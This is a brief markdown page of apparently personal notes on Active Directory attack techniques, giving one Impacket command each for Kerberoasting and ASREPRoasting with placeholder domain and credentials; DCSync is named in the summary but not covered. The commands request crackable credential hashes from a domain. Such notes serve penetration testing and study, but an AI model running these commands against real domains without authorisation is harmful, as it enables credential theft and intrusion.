---
title: "Active Directory Attack Notes"
date: 2026-02-10
summary: "Personal notes on AD attack paths — Kerberoasting, ASREPRoasting, DCSync."
explore:
  - Notes
draft: false
---

## Kerberoasting

```bash
GetUserSPNs.py -request domain.local/user:password
```

## ASREPRoasting

```bash
GetNPUsers.py domain.local/ -usersfile users.txt -no-pass
```
